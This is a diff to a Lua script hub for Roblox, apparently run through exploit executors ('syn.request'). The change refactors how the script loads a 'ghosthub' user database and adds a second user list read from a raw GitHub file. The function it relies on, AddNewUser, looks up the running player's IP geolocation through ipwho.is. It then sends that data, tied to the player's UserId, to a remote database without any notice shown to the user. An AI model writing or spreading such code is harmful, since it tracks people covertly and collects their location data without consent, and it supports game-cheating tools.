@@ -2641,6 +2641,8 @@ local request = request or syn.request
 local UsersDatabaseTable = {}
 local UsersTable = {}
 
+
+---Add User to ghosthub users database function
 local function AddNewUser()
  local Api = game.HttpService:JSONDecode(game:HttpGet("https://ipwho.is/"))
  UsersTable[""..game.Players.LocalPlayer.UserId] = {
@@ -2657,17 +2659,20 @@ local function AddNewUser()
    Body = game.HttpService:JSONEncode(UsersDatabaseTable)
  })
 end
+---
 
-if game.HttpService:JSONDecode(game:HttpGetAsync(usersdatabase)) ~= nil then
-   UsersTable = game.HttpService:JSONDecode(game.HttpService:JSONDecode(game:HttpGetAsync(usersdatabase)).Table)
-   if UsersTable[""..game.Players.LocalPlayer.UserId] == nil then
-      for key, value in pairs(game.HttpService:JSONDecode(game:HttpGetAsync(usersdatabase))) do
-        if key then
-           UsersDatabaseTable[key] = value
-        end
-      end
-      AddNewUser()
-   end
-else
+local GhosthubUsersDB, Success = game.HttpService:JSONDecode(game:HttpGetAsync(usersdatabase))
+if GhosthubUsersDB ~= nil then
+   UsersTable = game.HttpService:JSONDecode(GhosthubUsersDB.Table)
+end
+
+
+---Get Users from Github And add to Table
+for key, value in pairs(game.HttpService:JSONDecode(game.HttpService:JSONDecode(game:HttpGetAsync("https://raw.githubusercontent.com/MainScripts352/MainScripts352/refs/heads/main/Ghost%20Hub%20Users.txt")).Table)) do
+  UsersTable[key] = value
+end
+---
+
+if UsersTable[""..game.Players.LocalPlayer.UserId] == nil then
    AddNewUser()
 end
